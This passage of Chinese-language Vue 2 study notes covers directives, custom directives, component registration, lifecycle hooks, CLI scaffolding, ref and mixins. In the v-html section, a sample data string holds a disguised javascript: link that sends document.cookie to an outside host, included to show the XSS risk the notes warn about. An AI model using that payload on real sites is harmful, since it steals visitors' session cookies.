					Vue.set(this.student.hobby,0,'开车')
					//this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					// 过滤属性
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

![image-20231120221359726](vue%E7%AC%94%E8%AE%B0.assets/image-20231120221359726.png)

## 指令

### 内置指令

1.  v-text : 更新元素的textContent
2. v-html : 更新元素的innerHTML
3. v-if : 如果为true, 当前标签才会输出到页面
4. v-else: 如果为false, 当前标签才会输出到页面
5. v-show : 通过控制display 样式来控制显示/隐藏
6. v-for : 遍历数组/对象
7. v-on : 绑定事件监听, 一般简写为@
8. v-bind : 绑定解析表达式, 可以省略v-bind
9. v-model : 双向数据绑定
10.  v-cloak : 防止闪现, 与css 配合: [v-cloak] { display: none }

#### 1.v-text_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				我们学过的指令：
						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
						v-model	: 双向数据绑定
						v-for  	: 遍历数组/对象/字符串
						v-on   	: 绑定事件监听, 可简写为@
						v-if 	 	: 条件渲染（动态控制节点是否存存在）
						v-else 	: 条件渲染（动态控制节点是否存存在）
						v-show 	: 条件渲染 (动态控制节点是否展示)
				v-text指令：
						1.作用：向其所在的节点中渲染文本内容。和{{}}类似
						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则会翻译成对应标签。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div>你好，{{str}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div> 	<!-- //运行结果: '<h3>你好啊！</h3>' -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```

![image-20231120223145197](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223145197.png)

#### 2.v-html_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).必须要在可信的内容上使用v-html，永不要用在用户提交的内容上！   --- 必须要在可信的内容上使用v-html
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

![image-20231120223130764](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223130764.png)

#### 3.v-cloak_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 
				v-cloak指令（没有值）：
						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。     -------  解决网速慢时页面展示出{{xxx}}的问题
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<!-- //放在后面不会阻塞 -->
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

#### 4.v-once_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-once指令：
						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。   ---------- 用于优化性能,以后该数据的改变不会改变
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

![](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223554967.png)

#### 5.v-pre_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-pre指令：
					1.跳过其所在节点的编译过程。
					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。 
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

![image-20231120223712618](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223712618.png)

### 自定义指令

#### 一、全局自定义指令

在 `main.js` 使用 `Vue.directive` 声明一个全局指令

比如注册一个全局自定义指令 `v-focus`，用于自动获取输入焦点 :

```javascript
Vue.directive('focus', {
  // 当被绑定的元素插入到 DOM 中时……
  inserted: function (el) {
    // 聚焦元素
    el.focus()
  }
})
```

使用的时候：

```html
<input v-focus>
```

#### 二、组件自定义指令

在组件中，可以使用 `directives` 定义指令，比如以下获取焦点的指令：<br />

```vue
<template>
  <div>
    <input type="text">
    <input type="text" v-focus>
  </div>
</template>

<script>
export default {
  directives: {
    focus: {
      // 指令的定义
      inserted (el) {
        el.focus()
      }
    }
  }
}
</script>
```

在 directives 对象下声明指令的具体名称(`directiveName`)，声明指令的 inserted 方法，用于指令插入时调用，在模板中指令使用 `v-directiveName` 调用。

#### 三、自定义指令钩子:crossed_swords:

##### 钩子函数

一个指令定义对象可以提供如下几个钩子函数 (均为可选)：

- `bind`：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。
- `inserted`：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。
- `update`：所在组件的 VNode 更新时调用，**但是可能发生在其子 VNode 更新之前**。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。
- `componentUpdated`：指令所在组件的 VNode **及其子 VNode** 全部更新后调用。
- `unbind`：只调用一次，指令与元素解绑时调用。

##### 钩子函数参数

指令钩子函数会被传入以下参数：

- `el`：指令所绑定的元素，可以用来直接操作 DOM 。
- `binding` ：一个对象，包含以下属性：
  - `name`：指令名，不包括 `v-` 前缀。
  - `value`：指令的绑定值，例如：`v-my-directive="1 + 1"` 中，绑定值为 `2`。
  - `oldValue`：指令绑定的前一个值，仅在 `update` 和 `componentUpdated` 钩子中可用。无论值是否改变都可用。
  - `expression`：字符串形式的指令表达式。例如 `v-my-directive="1 + 1"` 中，表达式为 `"1 + 1"`。
  - `arg`：传给指令的参数，可选。例如 `v-my-directive:foo` 中，参数为 `"foo"`。
  - `modifiers`：一个包含修饰符的对象。例如：`v-my-directive.foo.bar` 中，修饰符对象为 `{ foo: true, bar: true }`。
- `vnode`：Vue 编译生成的虚拟节点。
- `oldVnode`：上一个虚拟节点，仅在 `update` 和 `componentUpdated` 钩子中可用。

除了 `el` 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 [`dataset`](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/dataset) 来进行。

例如：

```html
<div id="hook-arguments-example" v-demo:foo.a.b="message"></div>
```

```javascript
Vue.directive('demo', {
  bind: function (el, binding, vnode) {
    var s = JSON.stringify
    el.innerHTML =
      'name: '       + s(binding.name) + '<br>' +
      'value: '      + s(binding.value) + '<br>' +
      'expression: ' + s(binding.expression) + '<br>' +
      'argument: '   + s(binding.arg) + '<br>' +
      'modifiers: '  + s(binding.modifiers) + '<br>' +
      'vnode keys: ' + Object.keys(vnode).join(', ')
  }
})

new Vue({
  el: '#hook-arguments-example',
  data: {
    message: 'hello!'
  }
})
```

输出：

```html
name: "demo"
value: "hello!"
expression: "message"
argument: "foo"
modifiers: {"a":true,"b":true}
vnode keys: tag, data, children, text, elm, ns, context, fnContext, fnOptions, fnScopeId, key, componentOptions, componentInstance, parent, raw, isStatic, isRootInsert, isComment, isCloned, isOnce, asyncFactory, asyncMeta, isAsyncPlaceholder
```

#### 四、自定义指令简写

在很多时候，我们只关心 `bind` 和 `update` 时触发相同行为，而不关心其它的钩子。可以这样写：

```javascript
Vue.directive('color-swatch', function (el, binding) {
  el.style.backgroundColor = binding.value
})
```

在组件中，可以简写为：

```javascript
directives: {
  txt (el, binding, vnode, oldVnode) {
    console.log(el) // <div>...</div>
    console.log(binding) // {name: "txt", rawName: "v-txt", value: 20, expression: "4*5", modifiers: {}}
    console.log(vnode) // VNode
    console.log(oldVnode) // VNode
    var s = JSON.stringify
    el.innerHTML =
      'name: ' + s(binding.name) + '<br>' +
      'rawName: ' + s(binding.rawName) + '<br>' +
      'value: ' + s(binding.value) + '<br>' +
      'expression: ' + s(binding.expression) + '<br>' +
      'argument: ' + s(binding.arg) + '<br>' +
      'modifiers: ' + s(binding.modifiers) + '<br>' +
      'vnode keys: ' + Object.keys(vnode).join(', ')
  }
}
```

#### 五、对象字面量

如果指令需要多个值，可以传入一个 JavaScript 对象字面量。记住，**指令函数能够接受所有合法的 JavaScript 表达式**。

```html
<div v-demo="{ color: 'white', text: 'hello!' }"></div>
```

```javascript
Vue.directive('demo', function (el, binding) {
  console.log(binding.value.color) // => "white"
  console.log(binding.value.text)  // => "hello!"
})
```

#### 六、动态指令参数

指令的参数可以是动态的。例如，在 `v-mydirective:[argument]="value"` 中，`argument` 参数可以根据组件实例数据进行更新！这使得自定义指令可以在应用中被灵活使用。

例如你想要创建一个自定义指令，用来通过固定布局将元素固定在页面上。我们可以像这样创建一个通过指令值来更新竖直位置像素值的自定义指令：

```html
<div id="baseexample">
  <p>Scroll down the page</p>
  <p v-pin="200">Stick me 200px from the top of the page</p>
</div>
```

```javascript
Vue.directive('pin', {
  bind: function (el, binding, vnode) {
    el.style.position = 'fixed'
    el.style.top = binding.value + 'px'
  }
})
new Vue({
  el: '#baseexample'
})
```

这会把该元素固定在距离页面顶部 200 像素的位置。但如果场景是我们需要把元素固定在左侧而不是顶部又该怎么办呢？这时使用动态参数就可以非常方便地根据每个组件实例来进行更新。

```html
<div id="dynamicexample">
  <h3>Scroll down inside this section ↓</h3>
  <p v-pin:[direction]="200">I am pinned onto the page at 200px to the left.</p>
</div>
```

```javascript
Vue.directive('pin', {
  bind: function (el, binding, vnode) {
    el.style.position = 'fixed'
    var s = (binding.arg == 'left' ? 'left' : 'top')
    el.style[s] = binding.value + 'px'
  }
})
new Vue({
  el: '#dynamicexample',
  data: function () {
    return {
      direction: 'left'
    }
  }
})
```

#### 七、综合代码:crossed_swords:

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
				自定义指令总结：
						一、定义语法：
									(1).局部指令：
												new Vue({															new Vue({
													directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
												}) 																		})
									(2).全局指令：
													Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)


								1. 注册全局指令
								Vue.directive('my-directive', function(el, binding){
									el.innerHTML = binding.value.toupperCase()
								})

								2. 注册局部指令
								directives : {
									'my-directive' : {
										bind (el, binding) {
											el.innerHTML = binding.value.toupperCase()
										}
									}
								}

								1) 使用指令
								v-my-directive='xxx'

						二、配置对象中常用的3个回调：
									(1).bind：指令与元素成功绑定时调用。
									(2).inserted：指令所在元素被插入页面时调用。
									(3).update：指令所在模板结构被重新解析时调用。

						三、备注：
									1.指令定义时不加v-，但使用时要加v-；
									2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
									3.指令针对的是节点
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>     // v-big 自定义指令
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">  // v-fbind 自定义指令
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			//指令
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				// 方法1
				big(el,binding){
					console.log('big',this)      //注意此处的this是window       ------------
					// console.log('big')
					el.innerText = binding.value * 10  //el.innerText = 修改内容   //binding表示自定义指令=的东西
				},
				// 方法2
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(el,binding){
						el.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```

#### 八、案例

```html
<div id="app">
  <div v-time="nowTime"></div>
  <div v-time="beforeTime"></div>
  <script src="js/vue.js"></script>
  <script src="js/time.js"></script>
  <script>
    new Vue({
      el: "#app",
      data() {
        return {
          nowTime: new Date().getTime(),
          beforeTime: 1628407242588,
        };
      },
      directives: {
        // 自定义指令
        time: {
          // 绑定一次性事件等初始化操作
          bind(el, binding) {
            el.innerHTML = Time.getFormatTime(binding.value);
            // 定时器1分钟更新1次
            el.timeout = setInterval(() => {
                el.innerHTML = Time.getFormatTime(binding.value);
            }, 60000);
          },
          unbind(el) {
            clearInterval(el.timeout);
            delete el.timeout;
          },
        },
      },
    });
  </script>
</div>

```

time.js

```js
var Time = {
  //获得当前时间戳
  getUnix: function () {
    var date = new Date();
    return date.getTime();
  },
  //获取今天0点0分0秒的时间戳
  getTodayUnix: function () {
    var date = new Date();
    date.setHours(0);
    date.setMinutes(0);
    date.setSeconds(0);
    date.setMilliseconds(0);
    return date.getTime();
  },
  //获取今年1月1日0点0秒的时间戳
  getYearUnix: function () {
    var date = new Date();
    date.setMonth(0);
    date.setDate(1);
    date.setHours(0);
    date.setMinutes(0);
    date.setSeconds(0);
    date.setMilliseconds(0);
    return date.getTime();
  },
  //获取标准年月日
  getLastDate: function (time) {
    var date = new Date(time);
    var month =
      date.getMonth() + 1 < 10
        ? "0" + (date.getMonth() + 1)
        : date.getMonth() + 1;
    var day = date.getDate() < 10 ? "0" + date.getDate() : date.getDate();
    return date.getFullYear() + "-" + month + "-" + day;
  },
  //转换时间
  getFormatTime: function (timestamp) {
    var now = this.getUnix();
    var today = this.getTodayUnix();
    var year = this.getYearUnix();
    var timer = (now - timestamp) / 1000;
    var tip = "";

    if (timer <= 0) {
      tip = "刚刚";
    } else if (Math.floor(timer / 60) <= 0) {
      tip = "刚刚";
    } else if (timer < 3600) {
      tip = Math.floor(timer / 60) + "分钟前";
    } else if (timer >= 3600 && timestamp - today >= 0) {
      tip = Math.floor(timer / 3600) + "小时前";
    } else if (timer / 86400 <= 31) {
      tip = Math.ceil(timer / 86400) + "天前";
    } else {
      tip = this.getLastDate(timestamp);
    }
    return tip;
  },
};
```

![image-20231208163449687](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231208163449687.png)

## ——————

## 组件:crossed_swords:

> 使用组件, 一般会使用vue-cli脚手架

Vue的组件化设计思想借鉴了Java的面向对象思想。Java认为万物皆对象，**在Vue中，万物皆组件**。

 也就是说，在实际的vue项目中，以及使用了Vue框架的项目中，Vue的对象都会以组件的形式出现，能被反复使用。

要想实现组件化，需要在页面中注册组件：

+ 全局注册
+ 本地注册

###  组件的全局注册

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vue组件的全局注册</title>
</head>
<body>

    <div id="app">

        <model1></model1>
        <model1></model1>
        <model1></model1>

    </div>
        <hr/>
    <div id="app1">

        <model1></model1>
        <model1></model1>
        <model1></model1>

    </div>


</body>

<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
<script>
	//通过Vue.component实现组件的全局注册，全局注册后的组件可以被重复使用。
    Vue.component("model1",{

        template:"<div><h1>{{title}}</h1><button type='button' @click='btnfn'>点我</button></div>",
        data:function(){
            return {
                title:"hello vue"
            }
        },
        methods:{
            btnfn:function(){
                alert("hello !!!");
            }
        }
    });

    new Vue({
        el:'#app'
    })
    new Vue({
        el:'#app1'
    })


</script>

</html>
```

###  组件的本地注册

vue的全局注册，也就意味着在页面的任意一个被vue绑定过的div中，都可以使用全局注册了的vue组件。

但是，如果是对vue组件进行本地注册，那么在其他被vue绑定的div中，不能使用该组件。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vue组件的本地(局部)注册</title>
</head>
<body>

    <div id="app">

        <model11></model11>
    </div>
	<hr/>
    <!--在这里使用组件model11会报错-->
    <div id="app1">
        <model11></model11>
    </div>


</body>

<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
<script>

    new Vue({
        el:'#app',
        components:{
            "model11":{

                template:"<div><h1>{{title}}</h1><button type='button' @click='btnfn'>点我</button></div>",
                data:function(){
                    return {
                        title:"hello vue"
                    }
                },
                methods:{
                    btnfn:function(){
                        alert("hello !!!");
                    }
                }
            }
        }
    })
    new Vue({
        el:'#app1'
    })

</script>
```

这是一个完整的Vue组件。该组件包含了三个部分：template（html视图层内容）、script（Model层）、style（CSS样式）。这样封装好的组件可以被复用，也可以作为其他组件的组成部分而被封装——Java的面向对象再次体现。

-  **特点1： template标签内，必须有且只能有一个根标签。** 
-  **特点2： componet中注册的组件中的data，必须是函数的形式。**
   如下： 

```html
data:function(){
return {
title:"hello vue"     
} 
}
```

###  组件的生命周期

Vue中的组件也是有生命周期的。一个Vue组件会经历：初始化、创建、绑定、更新、销毁等阶段，不同的阶段，都会有相应的生命周期钩子函数被调用。

```html
<!-- 
vm的一生(vm的生命周期)：
将要创建   调用beforeCreate函数。
创建完毕  ===> 调用created函数。
将要挂载  ===> 调用beforeMount函数。 (重要)
挂载完毕  ===> 调用mounted函数。=============>【重要的钩子】
将要更新  ===> 调用beforeUpdate函数。
更新完毕   ===> 调用updatedi函数。
(重要)将要销毁 ===> 调用beforeDestroyi函数。====>【重要的钩子】
销毁完毕==>   调用destroyed函数。


//       -----------------

常用的生命周期钩子：
1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。     
2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。


关于销毁Vue实例
1.销毁后借助Vue开发者工具看不到任何信息。
2.销毁后自定义事件会失效，但原生DOM事件依然有效。
3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
-->
<!-- 准备好一个容器-->
```



```html
<html>
	<head>
		<meta charset="UTF-8">
		<title>生命周期</title>
	</head>
	<body>
		<div id="app1">
			{{title}}
			<button type="button" @click="changeTitle">change title</button>
			<button type="button" @click="destroy">destroy</button>
		</div>
	</body>
	<script src="https://cdn.bootcss.com/vue/2.5.17-beta.0/vue.min.js"></script>
	<script>
		new Vue({
			el:"#app1",
			data:{
				title:"this is title"
			},
			methods:{
				changeTitle:function(){
					this.title= "new title";
				},
				destroy:function(){
					this.$destroy();
				}
			},
			beforeCreate(){
				console.log("beforeCreate")
			},
			created(){
				console.log("created")
			},
			beforeMount(){
				console.log("beforeMount")
			},
			mounted(){                                  // 初始化
				console.log("mounted")
			},
			beforeUpdate(){
				console.log("beforeUpdate")
			},
			updated(){
				console.log("updated")
			},
			beforeDestroy(){                            // 销毁
				console.log("beforeDestory")
			},
			destroyed(){
				console.log("destory")
			}
		})
	</script>
</html>
```

| 组件的生命周期钩子                                           |
| ------------------------------------------------------------ |
| ![img](vue%E7%AC%94%E8%AE%B0.assets/1646013757802-713c7e4d-740d-440d-a470-4630bd03666b.png) |

## 分析脚手架:crossed_swords:

index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
		<!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
		<!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
		<!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
		<!-- 引入第三方样式 -->
		<link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">          
		<!-- 配置网页标题 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
		<!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
		<!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```

package.json: 应用包配置文件

![image-20231121090938792](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121090938792.png)

mian.js

```js
/* 
	该文件是整个项目的入口文件
*/
//引入Vue
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'
//关闭vue的生产提示
Vue.config.productionTip = false

/* 
	关于不同版本的Vue：
	
		1.vue.js与vue.runtime.xxx.js的区别：
				(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。
				(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

		2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用
			render函数接收到的createElement函数去指定具体内容。
*/

//创建Vue实例对象---vm
new Vue({
	el:'#app',
	//render函数完成了这个功能：将App组件放入容器中
  render: h => h(App),
	// render:q=> q('h1','你好啊')

	// template:`<h1>你好啊</h1>`,
	// components:{App},
})
```

App.vue

```vue
<template>
	<div>
		<img src="./assets/logo.png" alt="logo">
		<School></School>          //使用组件
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './components/School'          // 引入组件
	import Student from './components/Student'

	export default {
		name:'App',
		components:{      // 引入组件
			School,
			Student
		}
	}
</script>
```

School.vue组件

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

Student.vue组件

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

## ref 属性

1. 被用来给元素或子组件注册引用信息（id=xxx的替代者）
2. 应用在html标签上**获取的是真实DOM元素**，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
   1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
   2. 获取：```this.$refs.xxx```

index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
		<!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
		<!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
		<!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
		<!-- 引入第三方样式 -->
		<link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">          
		<!-- 配置网页标题 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
		<!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
		<!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```

package.json: 应用包配置文件

![image-20231121090938792](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121090938792.png)

main.js

```js
// 引入Vue
import Vue from 'vue'
// 引入App
import App from './App.vue'
// 关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
})
```

App.vue

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>  //ref标签: 获取的是真实DOM元素
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App', //组件名称
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>
```

School.vue

```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	export default {
		name:'School', //组件名称
		data() {
			return {
				name:'尚硅谷',
				address:'北京·昌平'
			}
		},
	}
</script>

<style>
	.school{
		background-color: gray;
	}
</style>
```

![image-20231121090150379](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121090150379.png)

## mixin 混入[公共部分]

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

   ​	全局混入：```Vue.mixin(xxx)```
   ​	局部混入：```mixins:['xxx']	```

混入 (mixins) 是一种分发 Vue 组件中可复用功能的非常灵活的方式。混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被混入该组件本身的选项。

### 一、在全局中混入

如下例，为自定义的选项 `myOption` 注入一个处理器。

```html
<div id="app"></div>
```

```javascript
Vue.mixin({
  created: function () {
    var myOption = this.$options.myOption
    if (myOption) {
      console.log(myOption)
    }
  }
})

new Vue({
  template: `<h1>Hello world</h1>`,
  el: '#app',
  myOption: 'hello!'
})

// => "hello!"
```

:::warning
谨慎使用全局混入对象，因为会影响到每个单独创建的 Vue 实例 (包括第三方模板)。
:::

### 二、在组件中混入

#### 在全局组件中混入

使用 `Vue.extend` 混入一个可复用的组件选项。

```javascript
new Vue({
	template: `<h1>Hello world</h1>`,
  el: '#app'
})

// 定义一个混入对象
var myMixin = {
  created: function () {
    this.hello()
  },
  methods: {
    hello: function () {
      console.log('hello from mixin!')
    }
  }
}

// 定义一个使用混入对象的组件
var Component = Vue.extend({
  mixins: [myMixin]
})

var component = new Component()
Vue.component('componentTest', component)
```

```html
<script src="//unpkg.com/vue/dist/vue.js"></script>

<div id="app">
  <componentTest></componentTest>
</div>
```

#### 在Vue组件中混入

使用 mixins 混入一个可复用的组件选项。

```html
<template>
  <div>
    <p>hello</p>
  </div>
</template>

<script>
let myMixin = {
  created: function () {
    this.hello()
  },
  methods: {
    hello: function () {
      console.log('hello from mixin!')
    }
  }
}

export default {
  mixins: [myMixin]
}
</script>
```

### 三、选项合并

mixin 中，如果有跟组件同名的选项，数据对象在内部会进行浅合并 (一层属性深度)，在和组件的数据发生冲突时以组件数据优先。

```html
<div id="app"></div>
```

```javascript
var mixin = {
  data () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  template: `<h1>Hello world</h1>`,
  el: '#app',
  mixins: [mixin],
  data () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```

如上例，在 mixin 和组件中都存在 data 选项，内部同时存在 message 属性，将以组件中的优先，组件中不存在 foo，则使用 mixin 中的属性。

同名钩子函数将混合为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。

```javascript
var mixin = {
  created: function () {
